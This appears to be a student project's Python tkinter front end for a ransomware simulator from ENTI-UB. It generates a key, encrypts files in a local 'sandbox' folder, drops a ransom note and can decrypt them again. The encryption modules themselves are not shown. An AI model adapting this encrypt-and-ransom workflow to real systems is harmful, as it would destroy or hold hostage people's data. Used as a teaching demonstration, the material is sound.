import tkinter as tk
from tkinter import messagebox, scrolledtext
import os
import crypto_engine
import file_manager

# Configuracio
RUTA_SANDBOX = "sandbox"
RUTA_CLAU = "config_sys_04.dat"
EXTENSIONS_OK = [".py", ".exe", ".dat", ".locked"] 

class AplicacioHacker:
    def __init__(self, finestra):
        self.finestra = finestra
        self.finestra.title("TERMINAL DE CIBERSEGURETAT - ENTI UB")
        self.finestra.geometry("1000x600")
        self.finestra.resizable(False, False) 
        
        self.color_fons = "#000000"
        self.color_text = "#00FF00"
        self.color_boto = "#1a1a1a"
        self.color_hover = "#333333"
        
        self.finestra.configure(bg=self.color_fons)
        
        
        self.finestra.protocol("WM_DELETE_WINDOW", self.sortida_segura)
        
        self.txt_consola = None 
        self.pantalla = None
        self.pantalla_inici()

    def netejar(self):
        if self.pantalla:
            self.pantalla.destroy()

    # --- PANTALLA 1: INICI ---
    def pantalla_inici(self):
        self.netejar()
        self.pantalla = tk.Frame(self.finestra, bg=self.color_fons)
        self.pantalla.pack(expand=True, fill="both")

        contingut = tk.Frame(self.pantalla, bg=self.color_fons)
        contingut.place(relx=0.5, rely=0.5, anchor="center")

        tk.Label(contingut, text="GENERADOR DE RANSOMWARE", 
                 fg=self.color_text, bg=self.color_fons, font=("Consolas", 28, "bold")).pack(pady=20)
        
        tk.Label(contingut, text="MARC FERNANDEZ - MARTI OLIVER", 
                 fg=self.color_text, bg=self.color_fons, font=("Consolas", 16)).pack(pady=10)
        
        tk.Label(contingut, text="ENTI - UNIVERSITAT DE BARCELONA", 
                 fg=self.color_text, bg=self.color_fons, font=("Consolas", 12)).pack(pady=5)

        tk.Label(contingut, text="[ PREM ESPAI PER ACCEDIR AL SISTEMA ]", 
                 fg="#ffffff", bg=self.color_fons, font=("Consolas", 18)).pack(pady=60)

       
        self.finestra.bind("<space>", self.anar_a_menu)

    def anar_a_menu(self, event):
        self.finestra.unbind("<space>")
        self.pantalla_menu()

    # --- PANTALLA 2: MENU PRINCIPAL ---
    def pantalla_menu(self):
        self.netejar()
        self.pantalla = tk.Frame(self.finestra, bg=self.color_fons)
        self.pantalla.pack(expand=True, fill="both")

        contingut = tk.Frame(self.pantalla, bg=self.color_fons)
        contingut.place(relx=0.5, rely=0.5, anchor="center")

        tk.Label(contingut, text="--- PANELL DE CONTROL ---", 
                 fg=self.color_text, bg=self.color_fons, font=("Consolas", 22, "bold")).pack(pady=30)

        opcions = [
            ("EXECUTAR INFECCIO", self.accions_infectar),
            ("RECUPERAR DADES", self.accions_recuperar),
            ("CONSULTAR LOGS", self.accions_historial),
            ("TANCAR TERMINAL", self.sortida_segura)
        ]

        for text, comanda in opcions:
            btn = tk.Button(contingut, text=text, width=35, height=2,
                            bg=self.color_boto, fg=self.color_text, 
                            font=("Consolas", 12, "bold"),
                            activebackground=self.color_text,
                            activeforeground=self.color_fons,
                            command=comanda)
            

            btn.bind("<Enter>", lambda e, b=btn: b.config(bg=self.color_hover))
            btn.bind("<Leave>", lambda e, b=btn: b.config(bg=self.color_boto))
            btn.pack(pady=10)

    # --- PANTALLA 3: CONSOLA ---
    def crear_consola(self, titol):
        self.netejar()
        self.pantalla = tk.Frame(self.finestra, bg=self.color_fons)
        self.pantalla.pack(expand=True, fill="both")
        
        tk.Label(self.pantalla, text=f"> {titol}", fg=self.color_text, bg=self.color_fons, font=("Consolas", 14)).pack(pady=10)
        
        self.txt_consola = scrolledtext.ScrolledText(self.pantalla, width=110, height=25, bg="#050505", fg=self.color_text, font=("Consolas", 10))
        self.txt_consola.pack(pady=10, padx=20)
        
        tk.Button(self.pantalla, text="[ RETORN AL MENU ]", bg=self.color_boto, fg=self.color_text, font=("Consolas", 10), command=self.pantalla_menu).pack(pady=5)

    def afegir_a_consola(self, missatge):
        if self.txt_consola:
            self.txt_consola.insert(tk.END, missatge + "\n")
            self.txt_consola.see(tk.END)

    def sortida_segura(self):
        if messagebox.askyesno("SORTIR DEL PROGRAMA", "SEGUR QUE VOLS TANCAR LA TERMINAL?"):
            self.finestra.quit()

    def accions_infectar(self):
        self.crear_consola("EXECUTANT SIMULACIO DE MALWARE...")
        try:
            if not os.path.exists(RUTA_SANDBOX):
                messagebox.showerror("ERROR CRITIC", "Directori sandbox no trobat")
                return
            self.afegir_a_consola("Iniciant generacio de clau...")
            crypto_engine.generar_i_guardar_clau(RUTA_CLAU)
            clau = crypto_engine.carregar_clau(RUTA_CLAU)
            fitxers = file_manager.llistar_fitxers(RUTA_SANDBOX)
            for f in fitxers:
                if not any(f.endswith(ex) for ex in EXTENSIONS_OK):
                    crypto_engine.xifrar_arxiu(f, clau)
                    self.afegir_a_consola(f"SIMULACIO COMPLETADA: {os.path.basename(f)} xifrat")
            file_manager.generar_nota_rescat(RUTA_SANDBOX)
            self.afegir_a_consola("\n--- PROCES FINALITZAT AMB EXIT ---")
        except Exception as e:
            self.afegir_a_consola(f"ERROR: {e}")

    def accions_recuperar(self):
        self.crear_consola("DESENCRIPTANT INFORMACIO...")
        clau = crypto_engine.carregar_clau(RUTA_CLAU)
        if not clau:
            messagebox.showwarning("ACCES DENEGAT", "Falta la clau")
        else:
            fitxers = file_manager.llistar_fitxers(RUTA_SANDBOX)
            for f in fitxers:
                if f.endswith(".locked"):
                    crypto_engine.desxifrar_arxiu(f, clau)
                    self.afegir_a_consola(f"RESTAURAT: {os.path.basename(f)}")

    def accions_historial(self):
        self.crear_consola("ACCEDINT ALS REGISTRES DEL SISTEMA...")
        if os.path.exists(file_manager.RUTA_LOGS):
            with open(file_manager.RUTA_LOGS, "r") as f:
                self.afegir_a_consola(f.read())
        else:
            self.afegir_a_consola("Cap registre trobat.")

if __name__ == "__main__":
    root = tk.Tk()
    AplicacioHacker(root)
    root.mainloop()
